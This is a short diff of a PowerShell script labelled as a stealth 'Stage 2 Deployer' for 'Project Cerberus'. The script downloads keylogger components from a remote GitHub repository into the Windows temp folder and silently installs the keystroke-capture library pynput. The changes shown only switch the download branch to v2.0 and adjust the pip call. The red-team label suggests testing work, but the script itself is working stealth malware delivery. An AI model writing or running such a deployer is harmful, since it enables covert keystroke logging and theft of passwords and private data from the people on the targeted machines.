@@ -1,7 +1,7 @@
 # Project Cerberus - Stage 2 Deployer (STEALTH)
 
 $dir  = "C:\Windows\Temp\cerberus"
-$base = "https://raw.githubusercontent.com/pavelyoav-eng/-Project-Cerberus/refs/heads/master/red-team/keylogger"
+$base = "https://raw.githubusercontent.com/pavelyoav-eng/-Project-Cerberus/refs/heads/v2.0/red-team/keylogger"
 $log  = "C:\Windows\Temp\cerberus_deploy.log"
 
 function Log($msg) {
@@ -27,7 +27,7 @@ Log "Downloaded: requirements.txt"
 $pynputCheck = python -c "import pynput" 2>&1
 if ($LASTEXITCODE -ne 0) {
     Log "Running pip install..."
-    pip install -r "$dir\requirements.txt" -q 2>&1 | Out-Null
+    python -m pip install -r "$dir\requirements.txt" -q 2>&1 | Out-Null
     Log "pip install done"
 } else {
     Log "Dependencies already installed, skipping pip"
